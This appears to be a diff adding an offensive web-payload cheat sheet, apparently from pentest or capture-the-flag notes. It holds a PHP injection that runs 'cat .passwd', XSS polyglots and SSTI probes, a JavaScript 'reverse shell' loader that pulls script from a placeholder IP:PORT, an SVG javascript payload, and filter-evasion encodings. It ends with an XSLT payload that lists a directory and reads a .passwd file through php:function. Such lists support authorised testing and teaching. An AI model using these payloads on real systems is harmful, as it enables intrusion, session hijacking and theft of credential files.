@@ -1,0 +1,53 @@
+Payloads examples
+<pre>?page=../.passwd','..') === true || system("cat .passwd") || strpos('includes/index
+</pre>
+Fairly short, and will give indicators of basic SQLi, XSS and SSTI vulnerabilities
+<pre>'"&gt;&lt;svg/onload=alert()>{{7*7}}
+</pre>
+XSS. Try it on URL query, fragment & path. All input fields.
+<pre>"&gt;&lt;img src onerror=alert(1)&gt;
+"autofocus onfocus=alert(1)//
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+</pre>
+A remote JS reverse shell payload
+<pre>&lt;script&gt;setInterval(function(){d=document;z=d.createElement("script");z.src="//IP:PORT";d.body.appendChild(z)},0)&lt;/script&gt;
+</pre>
+SVG-embedded payload
+<pre>&lt;?xml version="1.0" standalone="no"?&gt;
+&lt;svg viewBox="0 0 100 100" xmlns="https://t.co/ZF7xUkMN3m"&gt;
+&lt;a href="javascript&amp;#9;:alert(1)"&gt;
+&lt;circle cx="50" cy="40" r="35"/&gt;
+&lt;/a&gt;
+&lt;svg&gt;
+</pre>
+
+<hr>
+
+Some useful filter evasion characters
+<pre>%0a%0d => CRLF
+
+%00 => Nullbyte
+
+%E2%80%AE => RTL Character (writes payloads backwards)
+</pre>
+XSLT Code execution, for instance
+<pre>&#x3C;xsl:stylesheet version=&#x22;1.0&#x22; xmlns:xsl=&#x22;http://www.w3.org/1999/XSL/Transform&#x22; xmlns:php=&#x22;http://php.net/xsl&#x22;&#x3E;
+&#x3C;xsl:template match=&#x22;/&#x22;&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;opendir&#x27;,&#x27;.6ff3200bee785801f420fba826ffcdee&#x27;)&#x22;/&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;readdir&#x27;)&#x22;/&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;readdir&#x27;)&#x22;/&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;readdir&#x27;)&#x22;/&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;readdir&#x27;)&#x22;/&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;readdir&#x27;)&#x22;/&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;readdir&#x27;)&#x22;/&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;readdir&#x27;)&#x22;/&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;readdir&#x27;)&#x22;/&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;readdir&#x27;)&#x22;/&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;readdir&#x27;)&#x22;/&#x3E;
+&#x3C;xsl:value-of select=&#x22;php:function(&#x27;file_get_contents&#x27;,&#x27;.6ff3200bee785801f420fba826ffcdee/.passwd&#x27;)&#x22;/&#x3E;
+&#x3C;/xsl:template&#x3E;
+&#x3C;/xsl:stylesheet&#x3E;
+</pre>
